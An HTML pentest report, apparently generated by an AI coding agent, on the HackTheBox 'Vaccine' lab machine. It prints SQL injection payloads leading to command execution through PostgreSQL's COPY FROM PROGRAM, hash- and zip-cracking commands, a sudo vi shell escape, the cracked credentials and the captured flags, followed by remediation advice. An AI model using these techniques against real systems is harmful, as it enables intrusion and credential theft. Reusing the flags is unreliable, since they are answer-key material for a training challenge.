@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pentest Report — 10.129.12.212 (Vaccine HTB)</title>
+  <style>
+    :root {
+      --bg: #0d0d0d;
+      --panel: #141414;
+      --border: #1f1f1f;
+      --green: #00ff41;
+      --red: #ff2d55;
+      --orange: #ff9500;
+      --yellow: #ffd60a;
+      --blue: #0af;
+      --gray: #888;
+      --text: #e0e0e0;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: 'Courier New', monospace; font-size: 14px; }
+    header { background: linear-gradient(135deg, #0d0d0d 0%, #111 100%); border-bottom: 1px solid var(--green); padding: 30px 40px; }
+    header h1 { color: var(--green); font-size: 28px; letter-spacing: 4px; text-transform: uppercase; }
+    header p { color: var(--gray); margin-top: 6px; font-size: 12px; letter-spacing: 2px; }
+    .badge { display: inline-block; padding: 3px 10px; border-radius: 3px; font-size: 11px; font-weight: bold; letter-spacing: 1px; }
+    .critical { background: rgba(255,45,85,0.15); border: 1px solid var(--red); color: var(--red); }
+    .high     { background: rgba(255,149,0,0.15); border: 1px solid var(--orange); color: var(--orange); }
+    .medium   { background: rgba(255,214,10,0.15); border: 1px solid var(--yellow); color: var(--yellow); }
+    .info     { background: rgba(0,170,255,0.15); border: 1px solid var(--blue); color: var(--blue); }
+    .pwned    { background: rgba(0,255,65,0.15); border: 1px solid var(--green); color: var(--green); }
+
+    nav { display: flex; gap: 4px; padding: 0 40px; background: var(--panel); border-bottom: 1px solid var(--border); overflow-x: auto; }
+    nav a { color: var(--gray); text-decoration: none; padding: 12px 18px; font-size: 12px; letter-spacing: 1px; white-space: nowrap; border-bottom: 2px solid transparent; transition: all 0.2s; }
+    nav a:hover, nav a.active { color: var(--green); border-bottom-color: var(--green); }
+
+    .container { max-width: 1200px; margin: 0 auto; padding: 30px 40px; }
+    .section { margin-bottom: 40px; }
+    .section h2 { color: var(--green); font-size: 16px; letter-spacing: 3px; text-transform: uppercase; border-left: 3px solid var(--green); padding-left: 14px; margin-bottom: 20px; }
+
+    .summary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; margin-bottom: 30px; }
+    .stat-card { background: var(--panel); border: 1px solid var(--border); border-radius: 6px; padding: 20px; text-align: center; }
+    .stat-card .num { font-size: 36px; font-weight: bold; }
+    .stat-card .label { color: var(--gray); font-size: 11px; letter-spacing: 2px; margin-top: 6px; }
+    .stat-card.c .num { color: var(--red); }
+    .stat-card.h .num { color: var(--orange); }
+    .stat-card.m .num { color: var(--yellow); }
+    .stat-card.i .num { color: var(--blue); }
+    .stat-card.pwn .num { color: var(--green); }
+
+    .finding { background: var(--panel); border: 1px solid var(--border); border-radius: 6px; margin-bottom: 16px; overflow: hidden; }
+    .finding-header { display: flex; align-items: center; gap: 12px; padding: 14px 18px; border-bottom: 1px solid var(--border); cursor: pointer; }
+    .finding-header h3 { flex: 1; font-size: 14px; color: var(--text); }
+    .finding-body { padding: 18px; display: block; }
+    .finding-body p { color: var(--gray); margin-bottom: 10px; line-height: 1.6; }
+
+    .timeline { border-left: 2px solid var(--border); padding-left: 24px; margin: 10px 0; }
+    .timeline-item { position: relative; margin-bottom: 20px; }
+    .timeline-item::before { content: ''; position: absolute; left: -31px; top: 5px; width: 12px; height: 12px; border-radius: 50%; background: var(--green); border: 2px solid var(--bg); }
+    .timeline-item h4 { color: var(--green); font-size: 13px; margin-bottom: 4px; }
+    .timeline-item p { color: var(--gray); font-size: 12px; }
+
+    code, .code-block { background: #0a0a0a; border: 1px solid var(--border); border-radius: 4px; }
+    code { padding: 2px 6px; color: var(--green); font-family: 'Courier New', monospace; font-size: 12px; }
+    .code-block { display: block; padding: 14px; margin: 10px 0; overflow-x: auto; white-space: pre; color: #ccc; font-size: 12px; line-height: 1.5; }
+
+    table { width: 100%; border-collapse: collapse; }
+    th { background: #111; color: var(--green); text-align: left; padding: 10px 14px; font-size: 11px; letter-spacing: 2px; border-bottom: 1px solid var(--border); }
+    td { padding: 10px 14px; border-bottom: 1px solid var(--border); color: var(--text); font-size: 13px; }
+    tr:hover td { background: rgba(0,255,65,0.03); }
+
+    .flag-box { background: linear-gradient(135deg, rgba(0,255,65,0.05) 0%, rgba(0,255,65,0.02) 100%); border: 1px solid var(--green); border-radius: 6px; padding: 20px; margin: 10px 0; }
+    .flag-box .flag-label { color: var(--gray); font-size: 11px; letter-spacing: 2px; margin-bottom: 8px; }
+    .flag-box .flag-value { color: var(--green); font-size: 22px; letter-spacing: 4px; font-weight: bold; }
+
+    .cred-box { background: rgba(255,149,0,0.05); border: 1px solid var(--orange); border-radius: 6px; padding: 14px 18px; margin: 8px 0; }
+    .cred-box code { color: var(--orange); }
+
+    footer { border-top: 1px solid var(--border); padding: 20px 40px; text-align: center; color: var(--gray); font-size: 11px; letter-spacing: 2px; }
+    footer span { color: var(--green); }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>// Pentest Report</h1>
+  <p>TARGET: 10.129.12.212 (Vaccine — HackTheBox Starting Point) &nbsp;|&nbsp; DATE: 2026-02-26 &nbsp;|&nbsp; STATUS: <span style="color:var(--green)">ROOTED ✓</span></p>
+</header>
+
+<nav>
+  <a class="active" href="#summary">Summary</a>
+  <a href="#recon">Reconocimiento</a>
+  <a href="#vulns">Vulnerabilidades</a>
+  <a href="#attack">Attack Chain</a>
+  <a href="#creds">Credenciales</a>
+  <a href="#flags">Flags</a>
+  <a href="#remediation">Remediación</a>
+</nav>
+
+<div class="container">
+
+  <!-- SUMMARY -->
+  <div class="section" id="summary">
+    <h2>Executive Summary</h2>
+    <div class="summary-grid">
+      <div class="stat-card c"><div class="num">2</div><div class="label">CRITICAL</div></div>
+      <div class="stat-card h"><div class="num">2</div><div class="label">HIGH</div></div>
+      <div class="stat-card m"><div class="num">2</div><div class="label">MEDIUM</div></div>
+      <div class="stat-card i"><div class="num">2</div><div class="label">INFO</div></div>
+      <div class="stat-card pwn"><div class="num">ROOT</div><div class="label">PWNED</div></div>
+    </div>
+    <p style="color:var(--gray); line-height:1.7;">
+      El sistema objetivo <strong style="color:var(--text)">10.129.12.212</strong> (Ubuntu 19.10, hostname: <code>vaccine</code>) fue completamente comprometido.
+      La cadena de ataque comenzó con acceso FTP anónimo que expuso un archivo ZIP protegido.
+      El ZIP contenía código PHP con credenciales hasheadas. Tras crackear el hash MD5, se accedió al panel
+      administrativo web. El formulario de búsqueda era vulnerable a <strong style="color:var(--red)">SQL Injection</strong> sobre PostgreSQL,
+      lo que permitió ejecución remota de comandos como usuario <code>postgres</code> (superuser).
+      Finalmente, una mala configuración de <strong style="color:var(--orange)">sudo</strong> permitió la escalada de privilegios a <strong style="color:var(--red)">root</strong>
+      mediante la ejecución de <code>vi</code> como superusuario.
+    </p>
+  </div>
+
+  <!-- RECONOCIMIENTO -->
+  <div class="section" id="recon">
+    <h2>Reconocimiento</h2>
+    <h3 style="color:var(--blue); margin-bottom:12px; font-size:13px;">Puertos y Servicios Descubiertos</h3>
+    <table>
+      <tr><th>Puerto</th><th>Protocolo</th><th>Servicio</th><th>Versión</th><th>Hallazgo</th></tr>
+      <tr>
+        <td><code>21</code></td><td>TCP</td><td>FTP</td><td>vsftpd 3.0.3</td>
+        <td><span class="badge critical">Login Anónimo Activo</span></td>
+      </tr>
+      <tr>
+        <td><code>22</code></td><td>TCP</td><td>SSH</td><td>OpenSSH 8.0p1 Ubuntu</td>
+        <td><span class="badge info">Acceso con clave SSH robada</span></td>
+      </tr>
+      <tr>
+        <td><code>80</code></td><td>TCP</td><td>HTTP</td><td>Apache 2.4.41 (Ubuntu)</td>
+        <td><span class="badge critical">SQL Injection + RCE</span></td>
+      </tr>
+    </table>
+
+    <h3 style="color:var(--blue); margin-top:24px; margin-bottom:12px; font-size:13px;">Tecnologías Web Identificadas</h3>
+    <table>
+      <tr><th>Componente</th><th>Versión</th><th>Notas</th></tr>
+      <tr><td>Apache HTTPD</td><td>2.4.41</td><td>Ubuntu Linux</td></tr>
+      <tr><td>PHP</td><td>7.x</td><td>PHPSESSID cookie sin httponly flag</td></tr>
+      <tr><td>PostgreSQL</td><td>11.7</td><td>Usuario postgres con privilegios SUPERUSER</td></tr>
+    </table>
+
+    <h3 style="color:var(--blue); margin-top:24px; margin-bottom:12px; font-size:13px;">Rutas Web Encontradas (Gobuster)</h3>
+    <div class="code-block">index.php        [200] — Página de login MegaCorp
+dashboard.php    [302 → index.php] — Panel admin (requiere auth)
+license.txt      [200] — Archivo de licencia</div>
+  </div>
+
+  <!-- VULNERABILIDADES -->
+  <div class="section" id="vulns">
+    <h2>Vulnerabilidades Encontradas</h2>
+
+    <!-- VULN 1 -->
+    <div class="finding">
+      <div class="finding-header">
+        <span class="badge critical">CRITICAL</span>
+        <h3>FTP Anónimo con Archivo Sensible Expuesto</h3>
+        <span style="color:var(--gray); font-size:11px;">Puerto 21 / vsftpd 3.0.3</span>
+      </div>
+      <div class="finding-body">
+        <p>El servidor FTP permite autenticación anónima y expone el archivo <code>backup.zip</code> que contiene el código fuente de la aplicación web con credenciales hardcodeadas.</p>
+        <div class="code-block">ftp -n 10.129.12.212
+USER anonymous
+PASS anonymous
+get backup.zip</div>
+        <p><strong style="color:var(--text)">Impacto:</strong> Exposición de credenciales del panel de administración. Punto de entrada inicial de la cadena de ataque.</p>
+      </div>
+    </div>
+
+    <!-- VULN 2 -->
+    <div class="finding">
+      <div class="finding-header">
+        <span class="badge critical">CRITICAL</span>
+        <h3>SQL Injection con RCE — Parámetro ?search= (PostgreSQL SUPERUSER)</h3>
+        <span style="color:var(--gray); font-size:11px;">Puerto 80 / dashboard.php</span>
+      </div>
+      <div class="finding-body">
+        <p>El parámetro <code>?search=</code> en <code>dashboard.php</code> es vulnerable a SQL Injection sin sanitización. El usuario de base de datos es <code>postgres</code> con privilegios <strong>SUPERUSER</strong>, lo que permite ejecutar comandos del sistema operativo mediante <code>COPY FROM PROGRAM</code>.</p>
+        <div class="code-block"># Detección
+GET /dashboard.php?search=' → ERROR: unterminated quoted string
+
+# UNION Injection (5 columnas)
+GET /dashboard.php?search=' UNION SELECT NULL,version(),NULL,NULL,NULL-- -
+→ PostgreSQL 11.7 (Ubuntu 11.7-0ubuntu0.19.10.1)
+
+# Remote Code Execution
+'; CREATE TABLE rce_out(output text)-- -
+'; COPY rce_out FROM PROGRAM 'id'-- -
+→ uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)</div>
+        <p><strong style="color:var(--text)">Impacto:</strong> Ejecución arbitraria de comandos en el servidor como usuario <code>postgres</code>. Lectura de archivos del sistema, extracción de credenciales.</p>
+      </div>
+    </div>
+
+    <!-- VULN 3 -->
+    <div class="finding">
+      <div class="finding-header">
+        <span class="badge high">HIGH</span>
+        <h3>Credenciales Hardcodeadas en Código Fuente</h3>
+        <span style="color:var(--gray); font-size:11px;">backup.zip / index.php + dashboard.php</span>
+      </div>
+      <div class="finding-body">
+        <p>El archivo ZIP del FTP contenía el código fuente PHP con credenciales almacenadas directamente en el código:</p>
+        <div class="cred-box">
+          <code>index.php</code> → <code>admin : MD5(2cb42f8734ea607eefed3b70af13bbd3) = qwerty789</code>
+        </div>
+        <div class="cred-box">
+          <code>dashboard.php</code> → <code>pg_connect("...user=postgres password=P@s5w0rd!")</code>
+        </div>
+        <p><strong style="color:var(--text)">Impacto:</strong> Acceso al panel de administración web y a la base de datos PostgreSQL.</p>
+      </div>
+    </div>
+
+    <!-- VULN 4 -->
+    <div class="finding">
+      <div class="finding-header">
+        <span class="badge high">HIGH</span>
+        <h3>Escalada de Privilegios — sudo vi NOPASSWD (GTFOBins)</h3>
+        <span style="color:var(--gray); font-size:11px;">sudo misconfig / /bin/vi</span>
+      </div>
+      <div class="finding-body">
+        <p>El usuario <code>postgres</code> puede ejecutar <code>/bin/vi</code> como <code>root</code> sin contraseña de root (usando su propia contraseña). Esto permite escapar a una shell root mediante el comando interno de vi <code>:!bash</code>.</p>
+        <div class="code-block"># sudo -l output
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+# Explotación
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+# Dentro de vi:
+:!cat /root/root.txt
+# → dd6e058e814260bc70e9bbdef2715849 ✓</div>
+        <p><strong style="color:var(--text)">Impacto:</strong> Escalada completa a <strong style="color:var(--red)">root</strong>. Compromiso total del sistema.</p>
+      </div>
+    </div>
+
+    <!-- VULN 5 -->
+    <div class="finding">
+      <div class="finding-header">
+        <span class="badge medium">MEDIUM</span>
+        <h3>Contraseña Débil — Hash MD5 Crackeado</h3>
+        <span style="color:var(--gray); font-size:11px;">Panel Web / admin</span>
+      </div>
+      <div class="finding-body">
+        <p>La contraseña del administrador web estaba almacenada como hash MD5 sin sal (<em>unsalted</em>) y fue crackeada en segundos con rockyou.txt.</p>
+        <div class="code-block">Hash: 2cb42f8734ea607eefed3b70af13bbd3
+John --format=raw-md5 → qwerty789 (en &lt;1 segundo)</div>
+      </div>
+    </div>
+
+    <!-- VULN 6 -->
+    <div class="finding">
+      <div class="finding-header">
+        <span class="badge medium">MEDIUM</span>
+        <h3>Archivo ZIP con Contraseña Débil</h3>
+        <span style="color:var(--gray); font-size:11px;">FTP / backup.zip</span>
+      </div>
+      <div class="finding-body">
+        <p>El archivo <code>backup.zip</code> expuesto en el FTP anónimo estaba protegido con la contraseña <code>741852963</code>, crackeada con rockyou.txt en segundos.</p>
+        <div class="code-block">zip2john backup.zip > backup.hash
+john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
+→ 741852963</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ATTACK CHAIN -->
+  <div class="section" id="attack">
+    <h2>Cadena de Ataque</h2>
+    <div class="timeline">
+      <div class="timeline-item">
+        <h4>1. Reconocimiento — nmap Full Scan</h4>
+        <p>Descubrimiento de puertos 21 (FTP), 22 (SSH), 80 (HTTP). Detección de login FTP anónimo con <code>backup.zip</code> expuesto.</p>
+      </div>
+      <div class="timeline-item">
+        <h4>2. FTP Anónimo → backup.zip</h4>
+        <p>Descarga de <code>backup.zip</code> vía FTP sin credenciales. ZIP protegido con contraseña débil <code>741852963</code> crackeada con John.</p>
+      </div>
+      <div class="timeline-item">
+        <h4>3. Código PHP con Credenciales — admin:qwerty789</h4>
+        <p>El código fuente de <code>index.php</code> contenía la lógica de autenticación con hash MD5 <code>2cb42f8734ea607eefed3b70af13bbd3</code> → <code>qwerty789</code>.</p>
+      </div>
+      <div class="timeline-item">
+        <h4>4. SQL Injection → RCE (PostgreSQL SUPERUSER)</h4>
+        <p>Parámetro <code>?search=</code> vulnerable. UNION-based SQLi (5 columnas). Ejecución de comandos OS via <code>COPY FROM PROGRAM</code> como <code>postgres</code>.</p>
+      </div>
+      <div class="timeline-item">
+        <h4>5. Extracción SSH Key + Contraseña BD</h4>
+        <p>Lectura de <code>/var/lib/postgresql/.ssh/id_rsa</code> y contraseña PostgreSQL <code>P@s5w0rd!</code> desde <code>dashboard.php</code>. Acceso SSH directo como <code>postgres</code>.</p>
+      </div>
+      <div class="timeline-item">
+        <h4>6. User Flag ✓</h4>
+        <p>Lectura de <code>/var/lib/postgresql/user.txt</code> → <code style="color:var(--green)">ec9b13ca4d6229cd5cc1e09980965bf7</code></p>
+      </div>
+      <div class="timeline-item">
+        <h4>7. Escalada a Root — sudo vi GTFOBins</h4>
+        <p><code>sudo -l</code> reveló que postgres puede ejecutar <code>/bin/vi pg_hba.conf</code> como root. Mediante <code>:!cmd</code> dentro de vi se ejecutaron comandos como root.</p>
+      </div>
+      <div class="timeline-item">
+        <h4>8. Root Flag ✓ — Sistema Completamente Comprometido</h4>
+        <p>Lectura de <code>/root/root.txt</code> → <code style="color:var(--green)">dd6e058e814260bc70e9bbdef2715849</code></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- CREDENCIALES -->
+  <div class="section" id="creds">
+    <h2>Credenciales Obtenidas</h2>
+    <table>
+      <tr><th>Servicio</th><th>Usuario</th><th>Contraseña / Hash</th><th>Método</th></tr>
+      <tr>
+        <td>FTP</td><td><code>anonymous</code></td><td><code>anonymous</code></td>
+        <td><span class="badge info">Login anónimo</span></td>
+      </tr>
+      <tr>
+        <td>ZIP backup</td><td>—</td><td><code>741852963</code></td>
+        <td><span class="badge medium">John + rockyou.txt</span></td>
+      </tr>
+      <tr>
+        <td>Panel Web</td><td><code>admin</code></td><td><code>qwerty789</code> (MD5: 2cb42f8734...)</td>
+        <td><span class="badge medium">John raw-md5 + rockyou.txt</span></td>
+      </tr>
+      <tr>
+        <td>PostgreSQL</td><td><code>postgres</code></td><td><code>P@s5w0rd!</code></td>
+        <td><span class="badge high">Hardcoded en dashboard.php</span></td>
+      </tr>
+      <tr>
+        <td>SSH</td><td><code>postgres</code></td><td>id_rsa (clave privada robada)</td>
+        <td><span class="badge high">pg_read_file via SQLi</span></td>
+      </tr>
+    </table>
+  </div>
+
+  <!-- FLAGS -->
+  <div class="section" id="flags">
+    <h2>Flags Capturadas</h2>
+    <div class="flag-box">
+      <div class="flag-label">USER FLAG — /var/lib/postgresql/user.txt</div>
+      <div class="flag-value">ec9b13ca4d6229cd5cc1e09980965bf7</div>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">ROOT FLAG — /root/root.txt</div>
+      <div class="flag-value">dd6e058e814260bc70e9bbdef2715849</div>
+    </div>
+  </div>
+
+  <!-- REMEDIACIÓN -->
+  <div class="section" id="remediation">
+    <h2>Remediación Recomendada</h2>
+    <table>
+      <tr><th>Severidad</th><th>Vulnerabilidad</th><th>Acción Correctiva</th></tr>
+      <tr>
+        <td><span class="badge critical">CRITICAL</span></td>
+        <td>FTP Anónimo</td>
+        <td>Deshabilitar login anónimo en vsftpd. Mover archivos sensibles fuera del FTP.</td>
+      </tr>
+      <tr>
+        <td><span class="badge critical">CRITICAL</span></td>
+        <td>SQL Injection + RCE</td>
+        <td>Usar prepared statements / consultas parametrizadas. Principio de mínimo privilegio para el usuario DB.</td>
+      </tr>
+      <tr>
+        <td><span class="badge high">HIGH</span></td>
+        <td>Credenciales Hardcodeadas</td>
+        <td>Usar variables de entorno o gestores de secretos (Vault, AWS Secrets Manager). Nunca almacenar credenciales en código.</td>
+      </tr>
+      <tr>
+        <td><span class="badge high">HIGH</span></td>
+        <td>sudo vi misconfiguration</td>
+        <td>Eliminar la regla de sudo. Si es necesario editar pg_hba.conf, usar herramientas que no permitan escape de shell.</td>
+      </tr>
+      <tr>
+        <td><span class="badge medium">MEDIUM</span></td>
+        <td>Hash MD5 sin sal</td>
+        <td>Usar bcrypt, Argon2 o scrypt para almacenar contraseñas. Nunca usar MD5/SHA1 para passwords.</td>
+      </tr>
+      <tr>
+        <td><span class="badge medium">MEDIUM</span></td>
+        <td>Contraseñas débiles</td>
+        <td>Implementar política de contraseñas fuertes. Usar gestores de contraseñas.</td>
+      </tr>
+      <tr>
+        <td><span class="badge info">INFO</span></td>
+        <td>PHPSESSID sin HttpOnly</td>
+        <td>Establecer flag HttpOnly y Secure en cookies de sesión. Previene XSS-based session hijacking.</td>
+      </tr>
+      <tr>
+        <td><span class="badge info">INFO</span></td>
+        <td>Versiones desactualizadas</td>
+        <td>Ubuntu 19.10 llegó a EOL en julio 2020. Migrar a Ubuntu 22.04 LTS o superior.</td>
+      </tr>
+    </table>
+  </div>
+
+</div>
+
+<footer>
+  <p>Generado por <span>Claude Code — MCP Hacking Tools</span> &nbsp;|&nbsp; 2026-02-26 &nbsp;|&nbsp; Target: <span>10.129.12.212</span> &nbsp;|&nbsp; Vaccine HTB Starting Point</p>
+</footer>
+
+</body>
+</html>
